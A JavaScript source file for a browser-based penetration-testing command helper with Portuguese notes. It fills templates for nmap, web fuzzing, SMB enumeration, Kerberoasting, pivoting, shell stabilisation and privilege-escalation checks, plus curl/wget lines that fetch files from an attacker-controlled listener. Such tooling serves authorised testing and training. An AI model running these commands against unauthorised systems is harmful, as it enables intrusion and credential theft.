const STORE = {
  values: "pentestbench_values_v4",
  recipes: "pentestbench_recipes_v4",
  ws_log: "pentestbench_ws_log_v1",
  ws_check: "pentestbench_ws_check_v1",
  ws_creds: "pentestbench_ws_creds_v1"
};

const els = {};

function cacheEls() {
  els.tabs = Array.from(document.querySelectorAll(".tab"));
  els.views = {
    commands: document.getElementById("view-commands"),
    workspace: document.getElementById("view-workspace"),
    cheatsheet: document.getElementById("view-cheatsheet")
  };

  els.profile = document.getElementById("profile");

  els.ip = document.getElementById("ip");
  els.port = document.getElementById("port");
  els.url = document.getElementById("url");
  els.domain = document.getElementById("domain");
  els.user = document.getElementById("user");
  els.pass = document.getElementById("pass");
  els.wordlist = document.getElementById("wordlist");
  els.hashfile = document.getElementById("hashfile");
  els.lhost = document.getElementById("lhost");
  els.lport = document.getElementById("lport");
  els.iface = document.getElementById("iface");
  els.proxy = document.getElementById("proxy");

  els.cmdSearch = document.getElementById("cmdSearch");
  els.btnClearSearch = document.getElementById("btnClearSearch");
  els.commandsContainer = document.getElementById("commandsContainer");
  els.quickTags = document.getElementById("quickTags");

  els.btnToggleAll = document.getElementById("btnToggleAll");
  els.btnResetAll = document.getElementById("btnResetAll");
  els.btnCopyAll = document.getElementById("btnCopyAll");

  els.btnExport = document.getElementById("btnExport");
  els.btnImport = document.getElementById("btnImport");
  els.fileImport = document.getElementById("fileImport");

  els.wsLog = document.getElementById("wsLog");
  els.wsChecklist = document.getElementById("wsChecklist");
  els.wsCreds = document.getElementById("wsCreds");
  els.btnWsInsertTs = document.getElementById("btnWsInsertTs");
  els.btnWsCopyMd = document.getElementById("btnWsCopyMd");
  els.btnWsExport = document.getElementById("btnWsExport");
  els.btnWsClear = document.getElementById("btnWsClear");

  els.cheatsContainer = document.getElementById("cheatsContainer");
  els.btnCheatCopyAll = document.getElementById("btnCheatCopyAll");

  els.toast = document.getElementById("toast");
}

function loadJSON(key, fallback) {
  try {
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : fallback;
  } catch {
    return fallback;
  }
}

function saveJSON(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function toast(msg) {
  if (!els.toast) return;
  els.toast.textContent = msg;
  els.toast.classList.add("show");
  window.clearTimeout(toast._t);
  toast._t = window.setTimeout(() => els.toast.classList.remove("show"), 1200);
}

async function copy(text) {
  try {
    await navigator.clipboard.writeText(text);
    toast("Copiado.");
    return true;
  } catch {
    toast("Falha ao copiar.");
    return false;
  }
}

function escapeHtml(s) {
  return String(s ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll("\"", "&quot;")
    .replaceAll("'", "&#39;");
}

function pick(val, fallback) {
  const s = (val ?? "").toString().trim();
  return s ? s : fallback;
}

function getValues() {
  return {
    ip: els.ip.value.trim(),
    port: els.port.value.trim(),
    url: els.url.value.trim(),
    domain: els.domain.value.trim(),
    user: els.user.value.trim(),
    pass: els.pass.value.trim(),
    wordlist: els.wordlist.value.trim(),
    hashfile: els.hashfile.value.trim(),
    lhost: els.lhost.value.trim(),
    lport: els.lport.value.trim(),
    iface: els.iface.value.trim(),
    proxy: els.proxy.value.trim(),
    profile: els.profile.value
  };
}

function applyValues(v) {
  els.ip.value = pick(v.ip ?? els.ip.value, "10.10.10.10");
  els.port.value = pick(v.port ?? els.port.value, "443");
  els.url.value = pick(v.url ?? els.url.value, "");
  els.domain.value = pick(v.domain ?? els.domain.value, "corp.local");
  els.user.value = pick(v.user ?? els.user.value, "administrator");
  els.pass.value = pick(v.pass ?? els.pass.value, "Password123!");
  els.wordlist.value = pick(v.wordlist ?? els.wordlist.value, "/usr/share/wordlists/rockyou.txt");
  els.hashfile.value = pick(v.hashfile ?? els.hashfile.value, "/tmp/hashes.txt");
  els.lhost.value = pick(v.lhost ?? els.lhost.value, "10.10.14.5");
  els.lport.value = pick(v.lport ?? els.lport.value, "4444");
  els.iface.value = pick(v.iface ?? els.iface.value, "tun0");
  els.proxy.value = pick(v.proxy ?? els.proxy.value, "socks5://127.0.0.1:1080");
  els.profile.value = (v.profile ?? els.profile.value ?? "all");
}

function normalizeUrl(values) {
  if (values.url) return values.url;
  const host = values.ip || "";
  const port = values.port || "";
  if (!host) return "";
  if (!port || port === "80") return `http://${host}`;
  if (port === "443") return `https://${host}`;
  return `http://${host}:${port}`;
}

function computeDerived(values) {
  const url = normalizeUrl(values);
  return { ...values, url };
}

function renderCmdPlain(template, values) {
  return template.replace(/\{(\w+)\}/g, (_, k) => values[k] ?? "");
}

function renderCmdHighlightedSafe(template, values) {
  const parts = [];
  let last = 0;
  const re = /\{(\w+)\}/g;
  let m;

  while ((m = re.exec(template)) !== null) {
    parts.push(escapeHtml(template.slice(last, m.index)));
    const key = m[1];
    const val = values[key] ?? "";
    parts.push(`<span class="ph" title="${escapeHtml(key)}">${escapeHtml(val)}</span>`);
    last = m.index + m[0].length;
  }

  parts.push(escapeHtml(template.slice(last)));
  return parts.join("");
}

function toSpacedLinesHtml(multilineHtml) {
  const lines = String(multilineHtml ?? "").split("\n");
  return lines.map((l) => `<div class="codeLine">${l}</div>`).join("");
}

function applyCodeSpacingEl(codeEl) {
  codeEl.style.lineHeight = "1.85";
}

function stableAccentKey(str) {
  let h = 0;
  for (let i = 0; i < str.length; i++) h = ((h << 5) - h + str.charCodeAt(i)) | 0;
  const k = Math.abs(h) % 8;
  return ["A", "B", "C", "D", "E", "F", "G", "H"][k];
}

function snapshotOpenSections(containerEl) {
  const openKeys = new Set();
  if (!containerEl) return openKeys;

  containerEl.querySelectorAll(".section").forEach(sec => {
    if (sec.dataset.open === "true") {
      const k = sec.dataset.key || sec.querySelector(".sectionTitle")?.textContent?.trim() || "";
      openKeys.add(k);
    }
  });

  return openKeys;
}

function restoreOpenSections(containerEl, openSet) {
  if (!containerEl) return;

  containerEl.querySelectorAll(".section").forEach(sec => {
    const k = sec.dataset.key || sec.querySelector(".sectionTitle")?.textContent?.trim() || "";
    const shouldOpen = openSet.has(k);
    sec.dataset.open = shouldOpen ? "true" : "false";
    const body = sec.querySelector(".sectionBody");
    if (body) body.style.display = shouldOpen ? "grid" : "none";
  });
}

const DEFAULT_RECIPES = [
  {
    category: "Recon",
    icon: "ðŸ§­",
    profile: ["oscp", "web", "ad"],
    note: "Primeiro passe para mapear portas, serviÃ§os e superfÃ­cie.",
    items: [
      {
        name: "Nmap",
        tag: ["nmap", "recon"],
        note: "Use o full TCP para achar tudo, depois refine com scripts e versÃµes.",
        steps: [
          { title: "Full TCP", cmd: "nmap -p- -T4 {ip}" },
          { title: "Scripts e versÃµes", cmd: "nmap -sC -sV -p {port} {ip}" },
          { title: "UDP top", cmd: "sudo nmap -sU --top-ports 200 {ip}" }
        ]
      }
    ]
  },
  {
    category: "Web",
    icon: "ðŸŒ",
    profile: ["oscp", "web"],
    note: "Enum e validaÃ§Ãµes rÃ¡pidas para rotas e padrÃµes comuns.",
    items: [
      {
        name: "Directory fuzz",
        tag: ["web", "fuzz"],
        note: "Escolha uma wordlist compatÃ­vel com o alvo e ajuste a filtragem.",
        steps: [
          { title: "FFUF dir", cmd: "ffuf -u {url}/FUZZ -w {wordlist} -t 80 -fc 404" },
          { title: "Gobuster dir", cmd: "gobuster dir -u {url}/ -w {wordlist} -t 50 -x php,asp,aspx,txt,js" }
        ]
      },
      {
        name: "Vuln scan",
        tag: ["web", "scan"],
        steps: [
          { title: "Nikto", cmd: "nikto -h {url}" },
          { title: "Nuclei", cmd: "nuclei -u {url} -severity low,medium,high,critical" }
        ]
      }
    ]
  },
  {
    category: "SMB",
    icon: "ðŸªŸ",
    profile: ["oscp", "ad"],
    note: "Enum de shares e sinais de credenciais reutilizadas.",
    items: [
      {
        name: "Shares",
        tag: ["smb", "enum"],
        steps: [
          { title: "smbclient anon", cmd: "smbclient -L //{ip}/ -N" },
          { title: "CME shares", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\" --shares" }
        ]
      },
      {
        name: "RPC",
        tag: ["rpc", "enum"],
        steps: [
          { title: "rpcclient", cmd: "rpcclient -U \"{user}%{pass}\" {ip}" }
        ]
      }
    ]
  },
  {
    category: "Active Directory",
    icon: "ðŸ§©",
    profile: ["ad"],
    note: "Coleta e enum para trilhar caminhos no BloodHound.",
    items: [
      {
        name: "Collection",
        tag: ["ad", "bloodhound"],
        steps: [
          { title: "BloodHound Python", cmd: "bloodhound-python -d {domain} -u {user} -p \"{pass}\" -ns {ip} -c All" }
        ]
      },
      {
        name: "Kerberos",
        tag: ["ad", "impacket"],
        steps: [
          { title: "GetNPUsers", cmd: "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile {wordlist} -no-pass" },
          { title: "GetUserSPNs", cmd: "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {ip} -request" }
        ]
      }
    ]
  },
  {
    category: "File Transfer",
    icon: "ðŸ“¦",
    profile: ["oscp", "web", "ad"],
    note: "Transfer rÃ¡pido e previsÃ­vel. Evite reinventar a roda no meio da exploraÃ§Ã£o.",
    items: [
      {
        name: "HTTP",
        tag: ["transfer"],
        steps: [
          { title: "Python server", cmd: "python3 -m http.server {lport} --bind 0.0.0.0" },
          { title: "curl", cmd: "curl -L http://{lhost}:{lport}/FILE -o /tmp/FILE" },
          { title: "wget", cmd: "wget http://{lhost}:{lport}/FILE -O /tmp/FILE" }
        ]
      }
    ]
  },
  {
    category: "Pivoting",
    icon: "ðŸ§·",
    profile: ["oscp", "ad"],
    note: "Tunelamento e proxy para enumerar rede interna com consistÃªncia.",
    items: [
      {
        name: "SSH",
        tag: ["pivot", "ssh"],
        steps: [
          { title: "Local forward", cmd: "ssh -L 127.0.0.1:8888:{ip}:{port} {user}@{ip}" },
          { title: "SOCKS", cmd: "ssh -D 127.0.0.1:1080 {user}@{ip}" }
        ]
      },
      {
        name: "Proxychains",
        tag: ["proxy"],
        steps: [
          { title: "Exemplo", cmd: "proxychains -q nmap -sT -Pn -p {port} {ip}" }
        ]
      }
    ]
  }
];

function getRecipes() {
  const stored = loadJSON(STORE.recipes, null);
  return Array.isArray(stored) && stored.length ? stored : DEFAULT_RECIPES;
}

function setRecipes(recipes) {
  saveJSON(STORE.recipes, recipes);
}

let activeTag = "";
let allExpanded = false;

function buildTagSet(recipes) {
  const tags = new Set();
  recipes.forEach(g => g.items.forEach(it => (it.tag || []).forEach(t => tags.add(t))));
  return Array.from(tags).sort((a, b) => a.localeCompare(b));
}

function renderTagChips(tags) {
  els.quickTags.innerHTML = "";

  const mk = (label, isActive, onClick) => {
    const b = document.createElement("button");
    b.className = `chip ${isActive ? "active" : ""}`;
    b.textContent = label;
    b.addEventListener("click", onClick);
    return b;
  };

  els.quickTags.appendChild(mk("all", !activeTag, () => {
    activeTag = "";
    renderCommands();
  }));

  tags.slice(0, 18).forEach(t => {
    els.quickTags.appendChild(mk(t, activeTag === t, () => {
      activeTag = (activeTag === t) ? "" : t;
      renderCommands();
    }));
  });
}

function setTab(tab) {
  els.tabs.forEach(b => {
    const active = b.dataset.tab === tab;
    b.classList.toggle("active", active);
    b.setAttribute("aria-selected", active ? "true" : "false");
  });

  Object.entries(els.views).forEach(([k, v]) => {
    v.classList.toggle("active", k === tab);
  });
}

function setToggleAllLabel() {
  els.btnToggleAll.textContent = allExpanded ? "Collapse sections" : "Expand sections";
}

function expandAll(open) {
  const sections = Array.from(document.querySelectorAll(".section"));
  sections.forEach(sec => {
    const body = sec.querySelector(".sectionBody");
    sec.dataset.open = open ? "true" : "false";
    body.style.display = open ? "grid" : "none";
  });
  allExpanded = open;
  setToggleAllLabel();
}

function normalizeSteps(item) {
  if (Array.isArray(item.steps) && item.steps.length) return item.steps;
  if (item.cmd) return [{ title: item.name || "Command", cmd: item.cmd }];
  return [];
}

function sectionEl(group, values, query, profile, tag) {
  const section = document.createElement("div");
  section.className = "section";
  section.dataset.open = "false";
  section.dataset.accent = stableAccentKey(group.category || "x");
  section.dataset.key = group.category || "";

  const head = document.createElement("div");
  head.className = "sectionHead";

  const left = document.createElement("div");
  left.className = "sectionTitle";
  left.innerHTML = `<span>${group.icon || "â€¢"}</span><span>${escapeHtml(group.category)}</span>`;

  const badge = document.createElement("span");
  badge.className = "badge";

  const chev = document.createElement("span");
  chev.className = "chev";
  chev.textContent = "â–¾";

  head.appendChild(left);
  head.appendChild(badge);
  head.appendChild(chev);

  const body = document.createElement("div");
  body.className = "sectionBody";
  body.style.display = "none";

  const groupAllowed = !group.profile || group.profile.includes(profile) || profile === "all";

  const q = (query || "").trim().toLowerCase();

  const items = (group.items || [])
    .map(it => {
      const steps = normalizeSteps(it).map(s => {
        const cmdPlain = renderCmdPlain(s.cmd, values);
        const cmdHtml = renderCmdHighlightedSafe(s.cmd, values);
        return { ...s, cmdPlain, cmdHtml };
      });
      return { ...it, steps };
    })
    .filter(it => {
      if (!groupAllowed) return false;
      if (tag) {
        const tags = it.tag || [];
        if (!tags.includes(tag)) return false;
      }
      if (!q) return true;

      const hay = [
        it.name || "",
        (it.tag || []).join(" "),
        group.category || "",
        (it.note || ""),
        it.steps.map(s => `${s.title || ""} ${s.cmdPlain || ""}`).join(" ")
      ].join(" ").toLowerCase();

      return hay.includes(q);
    });

  badge.textContent = `${items.length} blocks`;

  if (group.note) {
    const n = document.createElement("div");
    n.className = "note";
    n.textContent = group.note;
    body.appendChild(n);
  }

  items.forEach(it => {
    const itemWrap = document.createElement("div");
    itemWrap.className = "itemWrap";

    const header = document.createElement("div");
    header.className = "itemHeader";

    const title = document.createElement("div");
    title.className = "itemHeaderTitle";
    title.textContent = it.name || "Block";

    const tags = document.createElement("div");
    tags.className = "itemHeaderTags";

    const firstTag = (it.tag && it.tag[0]) ? it.tag[0] : group.category;
    const tagEl = document.createElement("span");
    tagEl.className = "tag";
    tagEl.textContent = firstTag;
    tags.appendChild(tagEl);

    header.appendChild(title);
    header.appendChild(tags);

    itemWrap.appendChild(header);

    if (it.note) {
      const note = document.createElement("div");
      note.className = "note";
      note.textContent = it.note;
      itemWrap.appendChild(note);
    }

    it.steps.forEach(step => {
      if (step.title) {
        const st = document.createElement("div");
        st.className = "stepTitle";
        st.textContent = step.title;
        itemWrap.appendChild(st);
      }

      const card = document.createElement("div");
      card.className = "cmdCard";

      const top2 = document.createElement("div");
      top2.className = "cmdCardTop";

      const t = document.createElement("div");
      t.className = "title";
      t.textContent = "Command";

      const btn2 = document.createElement("button");
      btn2.className = "btn";
      btn2.textContent = "Copy";
      btn2.addEventListener("click", () => copy(step.cmdPlain));

      top2.appendChild(t);
      top2.appendChild(btn2);

      const code2 = document.createElement("div");
      code2.className = "code";
      applyCodeSpacingEl(code2);
      code2.innerHTML = toSpacedLinesHtml(step.cmdHtml);

      card.appendChild(top2);
      card.appendChild(code2);

      itemWrap.appendChild(card);
    });

    body.appendChild(itemWrap);
  });

  head.addEventListener("click", () => {
    const isOpen = section.dataset.open === "true";
    section.dataset.open = (!isOpen).toString();
    body.style.display = isOpen ? "none" : "grid";
  });

  section.appendChild(head);
  section.appendChild(body);
  return section;
}

function renderCommands() {
  const prevOpen = snapshotOpenSections(els.commandsContainer);

  const base = getValues();
  const values = computeDerived(base);

  if (!els.url.value.trim()) els.url.value = values.url;

  saveJSON(STORE.values, values);

  const q = (els.cmdSearch.value || "").trim();
  const profile = values.profile || "all";
  const recipes = getRecipes();

  els.commandsContainer.innerHTML = "";

  recipes.forEach(group => {
    const sec = sectionEl(group, values, q, profile, activeTag);
    els.commandsContainer.appendChild(sec);
  });

  restoreOpenSections(els.commandsContainer, prevOpen);

  setToggleAllLabel();
}

function resetAll() {
  applyValues({
    ip: "10.10.10.10",
    port: "443",
    url: "",
    domain: "corp.local",
    user: "administrator",
    pass: "Password123!",
    wordlist: "/usr/share/wordlists/rockyou.txt",
    hashfile: "/tmp/hashes.txt",
    lhost: "10.10.14.5",
    lport: "4444",
    iface: "tun0",
    proxy: "socks5://127.0.0.1:1080",
    profile: "all"
  });

  saveJSON(STORE.values, getValues());
  activeTag = "";
  els.cmdSearch.value = "";

  allExpanded = false;
  setToggleAllLabel();

  renderAll();
  toast("Resetado.");
}

function exportAll() {
  const payload = {
    version: "pentestbench_export_v4",
    exportedAt: new Date().toISOString(),
    values: getValues(),
    recipes: getRecipes(),
    workspace: {
      log: els.wsLog.value,
      checklist: els.wsChecklist.value,
      creds: els.wsCreds.value
    }
  };

  const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "pentestbench_export.json";
  a.click();
  URL.revokeObjectURL(url);
  toast("Exportado.");
}

async function importAll(file) {
  try {
    const text = await file.text();
    const data = JSON.parse(text);

    if (!data || typeof data !== "object") throw new Error("invalid");

    if (data.values) applyValues(data.values);
    if (Array.isArray(data.recipes)) setRecipes(data.recipes);

    if (data.workspace) {
      els.wsLog.value = data.workspace.log ?? els.wsLog.value;
      els.wsChecklist.value = data.workspace.checklist ?? els.wsChecklist.value;
      els.wsCreds.value = data.workspace.creds ?? els.wsCreds.value;
      persistWorkspace();
    }

    saveJSON(STORE.values, getValues());

    allExpanded = false;
    setToggleAllLabel();

    renderAll();
    toast("Importado.");
  } catch {
    toast("Import invÃ¡lido.");
  }
}

function persistWorkspace() {
  localStorage.setItem(STORE.ws_log, els.wsLog.value);
  localStorage.setItem(STORE.ws_check, els.wsChecklist.value);
  localStorage.setItem(STORE.ws_creds, els.wsCreds.value);
}

function nowStamp() {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  const yyyy = d.getFullYear();
  const mm = pad(d.getMonth() + 1);
  const dd = pad(d.getDate());
  const hh = pad(d.getHours());
  const mi = pad(d.getMinutes());
  const ss = pad(d.getSeconds());
  return `${yyyy}-${mm}-${dd} ${hh}:${mi}:${ss}`;
}

const CHEATS = [
  {
    category: "Linux",
    icon: "ðŸ§",
    note: "PÃ³s exploraÃ§Ã£o, priorize estabilizaÃ§Ã£o e enum do host antes de pivotar.",
    items: [
      {
        title: "Shell stabilization",
        note: "Primeiras aÃ§Ãµes apÃ³s shell limitada, estabilize para interatividade e conforto.",
        steps: [
          { title: "Checar shell e subir TTY", cmd: "echo $SHELL\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'" },
          { title: "Alternativas", cmd: "script -qc /bin/bash /dev/null\nperl -e 'exec \"/bin/bash\";'\nstty rows 40 columns 160" }
        ]
      },
      {
        title: "Enum quick",
        note: "Colete contexto e superfÃ­cies de privesc.",
        steps: [
          { title: "Identidade e SO", cmd: "id\nwhoami\nuname -a\ncat /etc/os-release" },
          { title: "Rede e serviÃ§os", cmd: "ip a\nss -tulpn\nps aux" },
          { title: "Sudo e SUID", cmd: "sudo -l\nfind / -perm -4000 -type f 2>/dev/null" }
        ]
      }
    ]
  },
  {
    category: "Windows",
    icon: "ðŸªŸ",
    note: "Enum de host, privilÃ©gios e serviÃ§os. Procure configuraÃ§Ãµes inseguras e abuso de paths.",
    items: [
      {
        title: "Host enum",
        note: "Base para privesc e movimentaÃ§Ã£o.",
        steps: [
          { title: "Info", cmd: "whoami\nsysteminfo\nipconfig /all\ntasklist /v" },
          { title: "PrivilÃ©gios", cmd: "whoami /priv\nwhoami /groups" }
        ]
      }
    ]
  },
  {
    category: "Active Directory",
    icon: "ðŸ§©",
    note: "Colete dados para graph e valide acessos SMB e Kerberos.",
    items: [
      {
        title: "Coleta",
        steps: [
          { title: "BloodHound", cmd: "bloodhound-python -d {domain} -u {user} -p \"{pass}\" -ns {ip} -c All" },
          { title: "Shares", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\" --shares" }
        ]
      },
      {
        title: "Kerberos",
        steps: [
          { title: "ASREPRoast", cmd: "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile {wordlist} -no-pass" },
          { title: "Kerberoast", cmd: "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {ip} -request" }
        ]
      }
    ]
  }
];

function renderCheatsheet() {
  const prevOpen = snapshotOpenSections(els.cheatsContainer);

  const base = getValues();
  const v = computeDerived(base);

  els.cheatsContainer.innerHTML = "";

  CHEATS.forEach(group => {
    const section = document.createElement("div");
    section.className = "section";
    section.dataset.open = "false";
    section.dataset.accent = stableAccentKey(group.category || "x");
    section.dataset.key = group.category || "";

    const head = document.createElement("div");
    head.className = "sectionHead";

    const left = document.createElement("div");
    left.className = "sectionTitle";
    left.innerHTML = `<span>${group.icon}</span><span>${escapeHtml(group.category)}</span>`;

    const badge = document.createElement("span");
    badge.className = "badge";
    badge.textContent = `${group.items.length} blocks`;

    const chev = document.createElement("span");
    chev.className = "chev";
    chev.textContent = "â–¾";

    head.appendChild(left);
    head.appendChild(badge);
    head.appendChild(chev);

    const body = document.createElement("div");
    body.className = "sectionBody";
    body.style.display = "none";

    if (group.note) {
      const n = document.createElement("div");
      n.className = "note";
      n.textContent = group.note;
      body.appendChild(n);
    }

    group.items.forEach(block => {
      const item = document.createElement("div");
      item.className = "item";
      item.dataset.open = "false";

      const itemHead = document.createElement("div");
      itemHead.className = "itemHead";

      const name = document.createElement("div");
      name.className = "itemName";
      name.textContent = block.title;

      const tag = document.createElement("span");
      tag.className = "tag";
      tag.textContent = group.category;
      name.appendChild(tag);

      const right = document.createElement("div");
      right.className = "row";

      const btn = document.createElement("button");
      btn.className = "btn";
      btn.textContent = "Copy all";
      btn.addEventListener("click", (e) => {
        e.stopPropagation();
        const text = (block.steps || [])
          .map(s => renderCmdPlain(s.cmd, v))
          .join("\n\n");
        copy(text);
      });

      const itemChev = document.createElement("span");
      itemChev.className = "itemChev";
      itemChev.textContent = "â–¾";

      right.appendChild(btn);
      right.appendChild(itemChev);

      itemHead.appendChild(name);
      itemHead.appendChild(right);

      const innerWrap = document.createElement("div");
      innerWrap.style.display = "none";
      innerWrap.style.paddingBottom = "10px";

      if (block.note) {
        const n2 = document.createElement("div");
        n2.className = "note";
        n2.textContent = block.note;
        innerWrap.appendChild(n2);
      }

      (block.steps || []).forEach(step => {
        if (step.title) {
          const st = document.createElement("div");
          st.className = "stepTitle";
          st.textContent = step.title;
          innerWrap.appendChild(st);
        }

        const card = document.createElement("div");
        card.className = "cmdCard";

        const top2 = document.createElement("div");
        top2.className = "cmdCardTop";

        const t = document.createElement("div");
        t.className = "title";
        t.textContent = "Command";

        const btn2 = document.createElement("button");
        btn2.className = "btn";
        btn2.textContent = "Copy";
        btn2.addEventListener("click", (e) => {
          e.stopPropagation();
          copy(renderCmdPlain(step.cmd, v));
        });

        top2.appendChild(t);
        top2.appendChild(btn2);

        const code2 = document.createElement("div");
        code2.className = "code";
        applyCodeSpacingEl(code2);

        const html = renderCmdHighlightedSafe(step.cmd, v);
        code2.innerHTML = toSpacedLinesHtml(html);

        card.appendChild(top2);
        card.appendChild(code2);

        innerWrap.appendChild(card);
      });

      itemHead.addEventListener("click", () => {
        const isOpen = item.dataset.open === "true";
        item.dataset.open = (!isOpen).toString();
        innerWrap.style.display = isOpen ? "none" : "block";
      });

      item.appendChild(itemHead);
      item.appendChild(innerWrap);
      body.appendChild(item);
    });

    head.addEventListener("click", () => {
      const isOpen = section.dataset.open === "true";
      section.dataset.open = (!isOpen).toString();
      body.style.display = isOpen ? "none" : "grid";
    });

    section.appendChild(head);
    section.appendChild(body);
    els.cheatsContainer.appendChild(section);
  });

  restoreOpenSections(els.cheatsContainer, prevOpen);
}

async function copyCheatAll() {
  const base = getValues();
  const v = computeDerived(base);

  const out = [];
  CHEATS.forEach(group => {
    out.push(`# ${group.category}`);
    if (group.note) out.push(`> ${group.note}`);
    out.push("");
    group.items.forEach(block => {
      out.push(`## ${block.title}`);
      if (block.note) out.push(`> ${block.note}`);
      out.push("");
      (block.steps || []).forEach(step => {
        out.push(`### ${step.title || "Step"}`);
        out.push(renderCmdPlain(step.cmd, v));
        out.push("");
      });
    });
  });

  await copy(out.join("\n"));
}

function workspaceToMarkdown() {
  const log = els.wsLog.value || "";
  const checklist = els.wsChecklist.value || "";
  const creds = els.wsCreds.value || "";

  return [
    "# Workspace",
    "",
    "## Engagement Log",
    "```",
    log.trimEnd(),
    "```",
    "",
    "## Checklist",
    "```",
    checklist.trimEnd(),
    "```",
    "",
    "## Creds",
    "```",
    creds.trimEnd(),
    "```",
    ""
  ].join("\n");
}

function exportWorkspace() {
  const md = workspaceToMarkdown();
  const blob = new Blob([md], { type: "text/markdown;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "pentestbench_workspace.md";
  a.click();
  URL.revokeObjectURL(url);
  toast("Exportado.");
}

function renderAll() {
  const tags = buildTagSet(getRecipes());
  renderTagChips(tags);
  renderCommands();
  renderCheatsheet();
}

function bind() {
  els.tabs.forEach(b => b.addEventListener("click", () => setTab(b.dataset.tab)));

  [
    els.profile, els.ip, els.port, els.url, els.domain, els.user, els.pass,
    els.wordlist, els.hashfile, els.lhost, els.lport, els.iface, els.proxy
  ].forEach(el => {
    el.addEventListener("input", () => {
      renderCommands();
      renderCheatsheet();
    });
    el.addEventListener("change", () => {
      renderCommands();
      renderCheatsheet();
    });
  });

  els.btnClearSearch.addEventListener("click", () => {
    els.cmdSearch.value = "";
    renderCommands();
  });

  els.cmdSearch.addEventListener("input", () => renderCommands());

  els.btnResetAll.addEventListener("click", resetAll);

  els.btnToggleAll.addEventListener("click", () => expandAll(!allExpanded));

  els.btnCopyAll.addEventListener("click", async () => {
    const base = getValues();
    const v = computeDerived(base);
    const profile = v.profile || "all";
    const q = (els.cmdSearch.value || "").trim().toLowerCase();
    const recipes = getRecipes();

    const lines = [];
    recipes.forEach(g => {
      const allowed = !g.profile || g.profile.includes(profile) || profile === "all";
      if (!allowed) return;

      lines.push(`## ${g.category}`);
      (g.items || []).forEach(it => {
        const tags = it.tag || [];
        if (activeTag && !tags.includes(activeTag)) return;

        const steps = normalizeSteps(it);
        steps.forEach(s => {
          const cmd = renderCmdPlain(s.cmd, v);
          if (q) {
            const hay = `${it.name} ${tags.join(" ")} ${cmd} ${g.category}`.toLowerCase();
            if (!hay.includes(q)) return;
          }
          lines.push(cmd);
        });
      });
      lines.push("");
    });

    await copy(lines.join("\n"));
  });

  els.btnExport.addEventListener("click", exportAll);
  els.btnImport.addEventListener("click", () => els.fileImport.click());

  els.fileImport.addEventListener("change", async () => {
    const f = els.fileImport.files && els.fileImport.files[0];
    els.fileImport.value = "";
    if (!f) return;
    await importAll(f);
  });

  els.wsLog.addEventListener("input", persistWorkspace);
  els.wsChecklist.addEventListener("input", persistWorkspace);
  els.wsCreds.addEventListener("input", persistWorkspace);

  els.btnWsInsertTs.addEventListener("click", () => {
    const stamp = `[${nowStamp()}] `;
    const cur = els.wsLog.value || "";
    els.wsLog.value = cur ? `${cur.trimEnd()}\n${stamp}` : stamp;
    persistWorkspace();
    toast("Timestamp inserido.");
  });

  els.btnWsCopyMd.addEventListener("click", async () => copy(workspaceToMarkdown()));
  els.btnWsExport.addEventListener("click", exportWorkspace);

  els.btnWsClear.addEventListener("click", () => {
    els.wsLog.value = "";
    els.wsChecklist.value = "";
    els.wsCreds.value = "";
    persistWorkspace();
    toast("Workspace limpo.");
  });

  els.btnCheatCopyAll.addEventListener("click", copyCheatAll);
}

function init() {
  cacheEls();

  const saved = loadJSON(STORE.values, null);
  if (saved) applyValues(saved);
  else applyValues({});

  const storedRecipes = loadJSON(STORE.recipes, null);
  if (!Array.isArray(storedRecipes) || !storedRecipes.length) setRecipes(DEFAULT_RECIPES);

  els.wsLog.value = localStorage.getItem(STORE.ws_log) || "";
  els.wsChecklist.value = localStorage.getItem(STORE.ws_check) || "";
  els.wsCreds.value = localStorage.getItem(STORE.ws_creds) || "";

  bind();

  allExpanded = false;
  setToggleAllLabel();

  renderAll();
  setTab("commands");
}

document.addEventListener("DOMContentLoaded", init);
